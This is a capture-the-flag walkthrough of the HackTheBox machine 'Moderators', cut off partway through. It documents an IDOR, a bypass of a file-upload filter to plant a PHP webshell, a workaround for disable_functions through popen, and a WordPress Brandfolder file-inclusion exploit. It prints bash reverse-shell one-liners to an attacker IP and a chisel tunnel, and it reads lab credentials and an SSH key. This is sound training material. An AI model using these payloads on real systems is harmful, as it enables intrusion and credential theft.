---
title: HTB: Moderators
url: https://0xdf.gitlab.io/2022/11/05/htb-moderators.html
date: 2022-11-05T13:45:00+00:00
difficulty: Hard [40]
os: Linux
tags: htb-moderators, hackthebox, ctf, nmap, feroxbuster, wfuzz, fuzz, crackstation, filter, burp, burp-repeater, upload, webshell, php-disable-functions, wordpress, wordpress-brandfolder, wordpress-passwords-manager, wordpress-plugin, source-code, crypto, virtualbox, virtualbox-encryption, pyvboxdie-cracker, hashcat, luks, chisel
---

![Moderators](https://0xdfimages.gitlab.io/img/moderators-cover.png)

Moderators was a long box with a bunch of web enumerations, some source code analysis, and cracking multiple passwords for a VM. I’ll start by enumerating a website to eventually find a file upload page, where I’ll bypass filters to get a webshell. With a shell, I’ll access an internal WordPress site exploiting the Brandfolder plugin to pivot to the next user. From there, with access to the WordPress config, I’ll get the MySQL password which gives access to secrets stored via another WordPress plugin. I’ll have to look at the source for that plugin to figure out how to decrypt the information and get another user’s SSH key. Finally, I’ll find a VirtualBox VM, and break through both VirtualBox encryption and LUKS to find a password that gets root access.

## Box Info

| Name | [Moderators](https://hackthebox.com/machines/moderators)  [Moderators](https://hackthebox.com/machines/moderators) [Play on HackTheBox](https://hackthebox.com/machines/moderators) |
| --- | --- |
| Release Date | [06 Aug 2022](https://twitter.com/hackthebox_eu/status/1587855453358260233) |
| Retire Date | 05 Nov 2022 |
| OS | Linux Linux |
| Base Points | Hard [40] |
| Rated Difficulty | Rated difficulty for Moderators |
| Radar Graph | Radar chart for Moderators |
| First Blood User | 01:08:23[htbas9du htbas9du](https://app.hackthebox.com/users/388108) |
| First Blood Root | 02:54:23[szymex73 szymex73](https://app.hackthebox.com/users/139466) |
| Creator | [kavigihan kavigihan](https://app.hackthebox.com/users/389926) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.173
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-01 12:35 UTC
Nmap scan report for 10.10.11.173
Host is up (0.099s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.85 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.173
Starting Nmap 7.80 ( https://nmap.org ) at 2022-08-01 12:35 UTC
Nmap scan report for 10.10.11.173
Host is up (0.092s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Moderators
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.26 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04.

### Website - TCP 80

#### Site

The site is for some kind of managed service / vulnerability assessment provider:

[![image-20220707150244808](https://0xdfimages.gitlab.io/img/image-20220707150244808.png)](https://0xdfimages.gitlab.io/img/image-20220707150244808.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220707150244808.png)

There’s not much in the way of interaction on the site. There are a few links in the menu and footer:
- “Home” leads back to `/`.
- “About” leads to `/about.php`, which does have names, images, and positions for various members of the staff. I could make a names list from here.
- “Contact” leads to `/contact.php`, which has a contact us form. I’ll try filling it out and submitting, but checking in Burp, I’ll notice that it just sends a GET request to `/send_mail.php`, and doesn’t include any of the fields. This seems to be a dead end.
- “Blog” leads to `/blog.php`, which has a blog. I’ll look at that more.
- “Service” leads to `/service.php`, which mostly has more text. This text is important, and I’ll note that they use PDF to submit logs / reports:

  > We do our best to make sure our clients’ requirements are fulfilled to their utmost satisfaction. Once you are registered with our service, you will receive an email asking for the basic information about your company and other associates. A form will be then sent along with what should be filled. After the form is sent back to us, our team will proceed the review process. If everything turns out well, we will confirm our partnership. Please note that all reports/logs must be uploaded in PDF format. For security reasons, we won’t accept any other format.

#### Blog

The blog page has five posts on it, each detailing some hacking technique:

[![image-20220707151129956](https://0xdfimages.gitlab.io/img/image-20220707151129956.png)](https://0xdfimages.gitlab.io/img/image-20220707151129956.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220707151129956.png)

The posts each talk about a vulnerability discovered at a “client”, kind of like hackerone Industry Reports.

Three of the five posts end with a link to the “REPORT”:

![image-20220707173328715](https://0xdfimages.gitlab.io/img/image-20220707173328715.png)

For example, one is to `/reports.php?report=8121`, and presents:

![image-20220801105552014](https://0xdfimages.gitlab.io/img/image-20220801105552014.png)

The other two have similar links, just different report numbers. The three report numbers are 3478, 4221, and 8121.

#### Tech Stack

The site is clearly based on PHP based on the file extensions. The HTTP response headers don’t give much additional information beyond the Apache version.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.173 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.173
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      295l      682w        0c http://10.10.11.173/
301      GET        9l       28w      313c http://10.10.11.173/images => http://10.10.11.173/images/
301      GET        9l       28w      311c http://10.10.11.173/logs => http://10.10.11.173/logs/
200      GET      283l      990w        0c http://10.10.11.173/blog.php
301      GET        9l       28w      310c http://10.10.11.173/css => http://10.10.11.173/css/
200      GET      267l      555w        0c http://10.10.11.173/contact.php
200      GET      318l      612w        0c http://10.10.11.173/about.php
200      GET      295l      682w        0c http://10.10.11.173/index.php
302      GET      226l      417w     7888c http://10.10.11.173/reports.php => index.php
200      GET      249l      589w        0c http://10.10.11.173/service.php
403      GET        9l       28w      277c http://10.10.11.173/.php
301      GET        9l       28w      318c http://10.10.11.173/images/blog => http://10.10.11.173/images/blog/
301      GET        9l       28w      319c http://10.10.11.173/logs/uploads => http://10.10.11.173/logs/uploads/
301      GET        9l       28w      315c http://10.10.11.173/logs/css => http://10.10.11.173/logs/css/
403      GET        9l       28w      277c http://10.10.11.173/images/.php
403      GET        9l       28w      277c http://10.10.11.173/server-status
302      GET        0l        0w        0c http://10.10.11.173/send_mail.php => /contact.php?msg=Email sent
[####################] - 5m    480000/480000  0s      found:17      errors:6219   
[####################] - 4m     60000/60000   201/s   http://10.10.11.173 
[####################] - 4m     60000/60000   202/s   http://10.10.11.173/ 
[####################] - 4m     60000/60000   202/s   http://10.10.11.173/images 
[####################] - 5m     60000/60000   198/s   http://10.10.11.173/logs 
[####################] - 4m     60000/60000   204/s   http://10.10.11.173/css 
[####################] - 4m     60000/60000   200/s   http://10.10.11.173/images/blog 
[####################] - 4m     60000/60000   202/s   http://10.10.11.173/logs/uploads 
[####################] - 5m     60000/60000   199/s   http://10.10.11.173/logs/css 

```

There’s a `/logs` directory and it has `css` and `uploads`. Worth noting, but nothing else to do with it now.

## Shell as www-data

### Find Upload Page

#### Reports IDOR

I’ll check all the four digit numbers 0-9999 to see if I can find any other reports:

```

oxdf@hacky$  wfuzz -z range,0000-9999 -u http://10.10.11.173/reports.php?report=FUZZ --hh 7888
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.173/reports.php?report=FUZZ
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000002590:   200        274 L    523 W    9786 Ch     "2589"
000003479:   200        275 L    526 W    9831 Ch     "3478"
000004222:   200        273 L    523 W    9880 Ch     "4221"
000007613:   200        275 L    523 W    9790 Ch     "7612"
000008122:   200        273 L    522 W    9784 Ch     "8121"
000009799:   200        276 L    525 W    9887 Ch     "9798"                                                 

Total time: 97.15477
Processed Requests: 10000
Filtered Requests: 9994
Requests/sec.: 102.9285

```

It finds six, three of which I didn’t know about already. This is known as an [Insecure Direct Object Reference](https://owasp.org/www-chapter-ghana/assets/slides/IDOR.pdf) (or IDOR) vulnerability, where an attacker can understand the pattern of how objects are referenced looking at what they are supposed to access, and find others they should not have access to.

#### New Reports

The first two new reports (2589 and 7612) don’t show anything particularly interesting. 9798 has an additional line in it:

![image-20220707195557095](https://0xdfimages.gitlab.io/img/image-20220707195557095.png)

It calls out a logs path. `feroxbuster` didn’t find this in `/logs` earlier, but it wouldn’t have checked something like this that looks like an MD5 hash.

#### Find Report

Visiting `/logs/e21cece511f43a5cb18d4932429915ed/` returns an empty page. But it is a different response from what I get if I change one character in the hex string, which returns 404 Not Found.

To find something in this folder, I’ll go back to `feroxbuster`. I’ll look for `.html` and `.php` given what I’ve run into already, and add in `.pdf` based on the mention of PDFs in the pages above. Right away it finds `logs.pdf`:

```

oxdf@hacky$ feroxbuster -u http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/ -x php,html,pdf

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💲  Extensions            │ [php, html, pdf]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET      214l      705w     8231c http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/logs.pdf
200      GET        0l        0w        0c http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/
403      GET        9l       28w      277c http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/.php
403      GET        9l       28w      277c http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/.html
200      GET        0l        0w        0c http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/index.html
[####################] - 3m    120000/120000  0s      found:5       errors:49     
[####################] - 3m    120000/120000  535/s   http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/

```

This file just says “Logs removed”:

![image-20220707202543834](https://0xdfimages.gitlab.io/img/image-20220707202543834.png)

#### Find Other logs.pdf Files

“e21cece511f43a5cb18d4932429915ed” looks like an MD5 hash. It’s 32 hexadecimal characters. To see if it’s a well known hash, I’ll throw it into [crackstation](https://crackstation.net/):

![image-20220707202713028](https://0xdfimages.gitlab.io/img/image-20220707202713028.png)

It’s the MD5 of 9798, the id from the report. I’ll confirm this in my terminal:

```

oxdf@hacky$ echo -n 9798 | md5sum
e21cece511f43a5cb18d4932429915ed  -

```

I’ll write a quick loop to generate the hashes of the reports I know about and then fuzz them with `wfuzz`:

```

oxdf@hacky$ for i in 2589 3478 4221 7612 8121 9798; do echo -n "$i" | md5sum; done | cut -d' ' -f1 > known_id_hashes

oxdf@hacky$ wfuzz -u http://10.10.11.173/logs/FUZZ/logs.pdf -w known_id_hashes 
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.173/logs/FUZZ/logs.pdf
Total requests: 6

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================

000000002:   200        219 L    906 W    9717 Ch     "b071cfa81605a94ad80cfa2bbc747448"
000000003:   200        219 L    906 W    9717 Ch     "74d90aafda34e6060f9e8433962d14fd"
000000005:   200        219 L    906 W    9717 Ch     "afecc60f82be41c1b52f6705ec69e0f1"
000000006:   200        219 L    906 W    9717 Ch     "e21cece511f43a5cb18d4932429915ed"
000000001:   200        238 L    1085 W   14575 Ch    "743c41a921516b04afde48bb48e28ce6"
000000004:   200        238 L    1057 W   14440 Ch    "ce5d75028d92047a9ec617acb9c34ce6"

Total time: 0.272622
Processed Requests: 6
Filtered Requests: 0
Requests/sec.: 22.00844

```

They all return data. I could check all four-digit ids relatively quickly in the background. I’ll block 404 responses here since I don’t need to see those:

```

oxdf@hacky$ for i in {0000..9999}; do echo -n "$i" | md5sum | cut -d' ' -f1 ; done > all_hashes
oxdf@hacky$ wfuzz -u http://10.10.11.173/logs/FUZZ/logs.pdf -w all_hashes --hc 404
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.173/logs/FUZZ/logs.pdf
Total requests: 10000

===================================================================
ID           Response   Lines    Word     Chars       Payload
===================================================================
000002590:   200        238 L    1085 W   14575 Ch    "743c41a921516b04afde48bb48e28ce6"
000003479:   200        219 L    906 W    9717 Ch     "b071cfa81605a94ad80cfa2bbc747448"
000004222:   200        219 L    906 W    9717 Ch     "74d90aafda34e6060f9e8433962d14fd"
000007613:   200        238 L    1057 W   14440 Ch    "ce5d75028d92047a9ec617acb9c34ce6"
000008122:   200        219 L    906 W    9717 Ch     "afecc60f82be41c1b52f6705ec69e0f1"
000009799:   200        219 L    906 W    9717 Ch     "e21cece511f43a5cb18d4932429915ed"

Total time: 89.25212
Processed Requests: 10000
Filtered Requests: 9994
Requests/sec.: 112.0421

```

It’s the same hits.

#### Logs

The two that are longer then 9717 characters (the “Logs removed” message). They are:

![image-20220707204629049](https://0xdfimages.gitlab.io/img/image-20220707204629049.png)

And:

![image-20220707204653558](https://0xdfimages.gitlab.io/img/image-20220707204653558.png)

Both have references to `/logs/report_log_upload.php`!

### RCE via WebShell

#### report\_log\_upload.php

This page presents a upload form:

![image-20220708134147791](https://0xdfimages.gitlab.io/img/image-20220708134147791.png)

If I try to upload an image, it returns an error:

![image-20220708134211672](https://0xdfimages.gitlab.io/img/image-20220708134211672.png)

Looking at the POST request itself shows HTML form data:

```

POST /logs/report_log_upload.php HTTP/1.1
Host: 10.10.11.173
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------397562302728835284121842646123
Content-Length: 188996
Origin: http://10.10.11.173
Connection: close
Referer: http://10.10.11.173/logs/report_log_upload.php
Upgrade-Insecure-Requests: 1
-----------------------------397562302728835284121842646123
Content-Disposition: form-data; name="MAX_FILE_SIZE"

200000
-----------------------------397562302728835284121842646123
Content-Disposition: form-data; name="pdfFile"; filename="htb.png"
Content-Type: image/png

...[snip raw image data]...
-----------------------------397562302728835284121842646123
Content-Disposition: form-data; name="administrator"

true
-----------------------------397562302728835284121842646123--

```

The name of the submitted file is “pdfFile”.

#### Bypass Filter

Something on the server is rejecting my image because it’s not a PDF. There are three ways that the server typically will do these checks, looking at the:
- MIME type (`Content-Type`) in the form submission;
- magic bytes at the start of the file (how the `file` command works);
- and file extension.

I’ll send the POST request to Burp Repeater and play. Changing any one of these doesn’t work. I’ll need to change all three.

The MIME type of PDFs is `application/pdf`, so I’ll make that change. According to [this Wikipedia page](https://en.wikipedia.org/wiki/List_of_file_signatures), PDFs start with the five bytes `%PDF-`. That’s easy enough to add at the start of the file. I’ll change the `filename` parameter to `htb.pdf`.

![image-20220708135505875](https://0xdfimages.gitlab.io/img/image-20220708135505875.png)

At this point I’m just trying to get something accepted, and then I can work backwards to find something useful for exploitation. This one works!

![image-20220708135547022](https://0xdfimages.gitlab.io/img/image-20220708135547022.png)

Interestingly, if I try to upload the same filename again, it complains:

![image-20220708135914477](https://0xdfimages.gitlab.io/img/image-20220708135914477.png)

#### Find Uploads

I noted above that `feroxbuster` identified a `/logs/uploads` directory. I’ll check there, and it does return a file:

![image-20220708135758531](https://0xdfimages.gitlab.io/img/image-20220708135758531.png)

The server is sending it as a PDF, which is visible in the HTTP response header, `Content-Type: application/pdf`, and that is generated typically from the file extension.

#### Upload PHP

If I want the server to process an upload as PHP, I need to get it up with a `.php` extension. When the server checks that the file has the PDF extension, a common mistake is to look for the string `.pdf` in the string, not just at the end.

I can try uploading as `htb.pdf.php`, and it works!

I’ll modify the payload to keep the magic bytes for PDF, but also include PHP script:

![image-20220708142459762](https://0xdfimages.gitlab.io/img/image-20220708142459762.png)

If I go right to a webshell or reverse shell, it will fail. It’s always wise to start with a simple command like `echo` because it’s unlikely to be blocked on the server. This uploads fine, and on visiting it, it prints `test`:

![image-20220708142537769](https://0xdfimages.gitlab.io/img/image-20220708142537769.png)

#### Find Disabled Function

If I try to upload a webshell, with something like `<?php system($_REQUEST["cmd"]); ?>` in it, it will fail. To debug this, I’ll upload this:

![image-20220708143928474](https://0xdfimages.gitlab.io/img/image-20220708143928474.png)

Now `/logs/uploads/info.pdf.php` shows the output of the status of the current PHP instance:

[![image-20220708144005925](https://0xdfimages.gitlab.io/img/image-20220708144005925.png)](https://0xdfimages.gitlab.io/img/image-20220708144005925.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220708144005925.png)

A bit down the page, there’s a section that lists `disable_functions`:

![image-20220708144056410](https://0xdfimages.gitlab.io/img/image-20220708144056410.png)

#### popen

Many of the things I would use to get execution are included, the primary ones being `passthru`, `system`, `exec`, and `shell_exec`. If everything I wanted to use was gone, I could look at [Chankro](https://github.com/TarlogicSecurity/Chankro) (see my post about it [here](/2019/08/02/bypassing-php-disable_functions-with-chankro.html)). But there’s one function that’s useful and not disabled - `popen`. [The docs](https://www.php.net/manual/en/function.popen.php) say it “Opens process file pointer”, which isn’t the most descriptive description. Looking at the examples, it creates a process and returns a handle to that process that can be read / written to like a file.

One example from the docs is:

```

<?php
error_reporting(E_ALL);

/* Add redirection so we can get stderr. */
$handle = popen('/path/to/executable 2>&1', 'r');
echo "'$handle'; " . gettype($handle) . "\n";
$read = fread($handle, 2096);
echo $read;
pclose($handle);
?>

```

I’ll condense that into a single line:

![image-20220708144622370](https://0xdfimages.gitlab.io/img/image-20220708144622370.png)

It works:

![image-20220708144631035](https://0xdfimages.gitlab.io/img/image-20220708144631035.png)

### Shell

I’ll use `curl` to trigger a [Bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ curl -s http://10.10.11.173/logs/uploads/shell.pdf.php --data 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"'

```

On sending that, it hangs. But at `nc`, there’s a shell:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.173 53956
bash: cannot set terminal process group (802): Inappropriate ioctl for device
bash: no job control in this shell
www-data@moderators:/var/www/html/logs/uploads$

```

I’ll upgrade my shell using the standard tricks ([how this works](https://youtu.be/DqE6DxqJg8Q)):

```

www-data@moderators:/var/www/html/logs/uploads$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@moderators:/var/www/html/logs/uploads$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@moderators:/var/www/html/logs/uploads$ 

```

## Shell as lexi

### Enumeration

#### /var/www

There’s not much else to find in `/var/www` (www-data’s home directory). The application is written in PHP, and doesn’t use a database, just files to manage itself. I don’t see much interesting here to help me further.

#### Find Additional Site

`netstat` shows a few services listening on localhost:

```

www-data@moderators:/var/www/html/logs$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -   

```

53 is DNS, which isn’t unusual for Ubuntu. But 8080 would typically be another webserver. It doesn’t make sense that 3306 (MySQL) would be listening if there’s no DB in the web application, unless there’s another website or something else using it.

`curl` confirms it’s another webserver:

```

www-data@moderators:/var/www/html/logs$ curl 127.0.0.1:8080
<!doctype html>
<html lang="en-US" >
<head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <title>Moderators &#8211; Your Security Partner</title>
...[snip]...
<script src='http://127.0.0.1:8080/wp-content/themes/twentytwentyone/assets/js/primary-navigation.js?ver=1.4' id='twenty-twenty-one-primary-navigation-script-js'></script>
<script src='http://127.0.0.1:8080/wp-content/themes/twentytwentyone/assets/js/responsive-embeds.js?ver=1.4' id='twenty-twenty-one-responsive-embeds-script-js'></script>
        <script>
        /(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",(function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())}),!1);
        </script>
</body>
</html>

```

It seems to be running WordPress.

### WordPress Site

#### Tunnel

Rather than try to manually enumerate these plugins, I’ll use [Chisel](https://github.com/jpillora/chisel) to Moderators by running a Python webserver in my directory with the Chisel binaries, and fetching it with `wget`. Then I’ll start the server on my VM:

```

oxdf@hacky$ /opt/chisel/chisel_1.7.7_linux_amd64 server -p 8000 --reverse
2022/08/11 08:56:34 server: Reverse tunnelling enabled
2022/08/11 08:56:34 server: Fingerprint GbL/Q+0gBjMr9yD1v1tnXxHBtDCFGB7S+GdtZQHQOcc=
2022/08/11 08:56:34 server: Listening on http://0.0.0.0:8000

```

And then connect to it with the client form Moderators:

```

www-data@moderators:/dev/shm$ chmod +x chisel_1.7.7_linux_amd64 
www-data@moderators:/dev/shm$ ./chisel_1.7.7_linux_amd64 client 10.10.14.6:8000 R:socks 
2022/08/11 10:17:17 client: Connecting to ws://10.10.14.6:8000
2022/08/11 10:17:18 client: Connected (Latency 87.548333ms)

```

It connects at the server:

```

2022/08/11 08:56:58 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

```

Now I can use FoxyProxy and `proxychains` to access the site.

#### Site

To get the WordPress page to load, I’ll set `moderators.htb` to 127.0.0.1 in my `/etc/hosts` file, and access it by hostname.

The site is a blog about vulnerabilities:

[![image-20220711061956426](https://0xdfimages.gitlab.io/img/image-20220711061956426.png)](https://0xdfimages.gitlab.io/img/image-20220711061956426.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20220711061956426.png)

The site is super slow, and I suspect a bunch of the DNS doesn’t work well over the tunnel.

#### WordPress Files

The process list shows the site is running out of `/opt/new.site`:

```

www-data@moderators:/var/www$ ps auxww | grep 8080
lexi         762  0.0  1.4 304588 57152 ?        S    Jul08   0:09 /usr/bin/php -S 127.0.0.1:8080 -t /opt/site.new/
www-data   13955  0.0  0.0   3304   732 pts/1    S+   10:01   0:00 grep 8080

```

The files are all owned by lexi with the moderators group, and unfortunately, www-data can’t read the `wp-config.php` file:

```

www-data@moderators:/opt/site.new$ ls -l
total 220
-rw-r--r--  1 lexi moderators   405 Sep 11  2021 index.php
-rw-r--r--  1 lexi moderators 19915 Jan 29 17:32 license.txt
-rw-r--r--  1 lexi moderators  7437 Jan 29 17:32 readme.html
-rw-r--r--  1 lexi moderators  7165 Sep 11  2021 wp-activate.php
drwxr-xr-x  9 lexi moderators  4096 Jan 29 19:16 wp-admin
-rw-r--r--  1 lexi moderators   351 Sep 11  2021 wp-blog-header.php
-rw-r--r--  1 lexi moderators  2338 Jan 29 17:32 wp-comments-post.php
-rw-r--r--  1 lexi moderators  3001 Jan 29 17:32 wp-config-sample.php
-rw-r--r--  1 lexi moderators  3004 Sep 11  2021 wp-config-sample.php.bak
-rwxr-----  1 lexi moderators  3118 Sep 11  2021 wp-config.php
drwxr-xr-x  6 lexi moderators  4096 Jul 10 21:33 wp-content
-rw-r--r--  1 lexi moderators  3939 Sep 11  2021 wp-cron.php
drwxr-xr-x 26 lexi moderators 12288 Jan 29 17:32 wp-includes
-rw-r--r--  1 lexi moderators  2496 Sep 11  2021 wp-links-opml.php
-rw-r--r--  1 lexi moderators  3900 Sep 11  2021 wp-load.php
-rw-r--r--  1 lexi moderators 47916 Jan 29 17:32 wp-login.php
-rw-r--r--  1 lexi moderators  8582 Jan 29 17:32 wp-mail.php
-rw-r--r--  1 lexi moderators 23025 Jan 29 17:32 wp-settings.php
-rw-r--r--  1 lexi moderators 31959 Jan 29 17:32 wp-signup.php
-rw-r--r--  1 lexi moderators  4747 Sep 11  2021 wp-trackback.php
-rw-r--r--  1 lexi moderators  3236 Sep 11  2021 xmlrpc.php

```

I can view the plugins used:

```

www-data@moderators:/opt/site.new/wp-content/plugins$ ls
brandfolder  index.php  passwords-manager

```

`passwords-manager` is interesting for sure, but I’ll need to read from the DB to do anything useful with it.

### Brandfolder Exploit

#### Identify

The `readme.txt` file in the `brandfolder` directory shows a current version of 3.0. Some Googling shows an [exploitDB page](https://www.exploit-db.com/exploits/39591) for a Local/Remote file inclusion vulnerability in this plugin:

![image-20220711133114239](https://0xdfimages.gitlab.io/img/image-20220711133114239.png)

#### Details

The code includes at least five files whose paths are constructed using user input, like:

```

require_once($_REQUEST['wp_abspath']  . 'wp-load.php');

```

Since I can control `wp_abspath`, I can put a `wp-load.php` file somewhere on the system and include it. Looking at `/opt/site.new/wp-content/plugins/brandfolder/callback.php`, it contains the vulnerable code:

```

 <?php
   ini_set('display_errors',1);
   ini_set('display_startup_errors',1);
   error_reporting(0);
 
   require_once($_REQUEST['wp_abspath']  . 'wp-load.php');
   require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/media.php');
   require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/file.php');
   require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/image.php');
   require_once($_REQUEST['wp_abspath']  . 'wp-admin/includes/post.php');
 
   $url = $_REQUEST['attachment_url'];
   if (false === strpos($url, '://')) {
     $url = 'http:' . $url;
   }
 ...[snip]...

```

#### Exploit POC

I’ll copy my already working webshell into `/dev/shm`:

```

www-data@moderators:/$ cp /var/www/html/logs/uploads/shell.pdf.php /dev/shm/wp-load.php

```

If I just point the `wp_abspath` at `/dev/shm`, it will find the file (though no execution):

```

www-data@moderators:/$ curl '127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/'       
%PDF-1.4
<br/>

```

On adding a `&cmd=[command]`, it works:

```

www-data@moderators:/$ curl '127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/&cmd=id'
%PDF-1.4
<br/>
uid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)

```

### Shell

#### Reverse Shell

Using that same webshell, I’ll send a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

www-data@moderators:/$ curl '127.0.0.1:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/dev/shm/&cmd=bash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.6/444+0>%261"'

```

At `nc`, there’s a shell as lexi:

```

oxdf@hacky$ nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.173 32896
bash: cannot set terminal process group (719): Inappropriate ioctl for device
bash: no job control in this shell
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ id
uid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)

```

I’ll grab `user.txt`:

```

lexi@moderators:~$ cat user.txt
f5866c4a************************

```

#### SSH

Rather than upgrade, I’ll notice that there’s a key pair in `~/.ssh`:

```

lexi@moderators:~/.ssh$ s
authorized_keys
id_rsa
id_rsa.pub

```

I’ll save a copy locally and connect over SSH:

```

oxdf@hacky$ ssh -i ~/keys/moderators-lexi lexi@10.10.11.173
Last login: Mon Jul 11 17:12:37 2022 from 10.10.14.6
lexi@moderators:~$

```

## Shell as john

### Enumeration

lexi is in the `moderators` group:

```

lexi@moderators:~$ id
uid=1001(lexi) gid=1001(lexi) groups=1001(lexi),1002(moderators)

```

This gives the account full access to the `site.new` directory, and the `wp-config.php` file. The most interesting bit in there is the DB connection info:

```

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );       

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpresspassword123!!' );
                                                    
/** MySQL hostname */
define( 'DB_HOST', 'localhost' );
                                                    
/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' ); 

```

I’ll try that password for both john and root, but without success.

### passwords-manager

#### Background

